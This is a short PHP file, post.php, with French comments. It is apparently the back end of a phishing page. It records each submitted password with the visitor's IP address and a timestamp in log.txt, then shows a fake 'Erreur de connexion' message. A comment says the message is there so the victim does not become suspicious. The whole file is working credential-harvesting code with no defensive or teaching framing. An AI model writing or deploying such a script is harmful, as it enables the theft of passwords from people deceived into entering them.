<?php
// post.php
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');
    
    // Écrire dans un fichier
    $log = "[$date] IP: $ip | Mot de passe: $password\n";
    file_put_contents('log.txt', $log, FILE_APPEND);
    
    // Rediriger vers une page d'erreur (pour ne pas éveiller les soupçons)
    echo "<h2>Erreur de connexion</h2>";
    echo "<p>Veuillez réessayer dans quelques instants.</p>";
} else {
    header('Location: index.html');
}
?>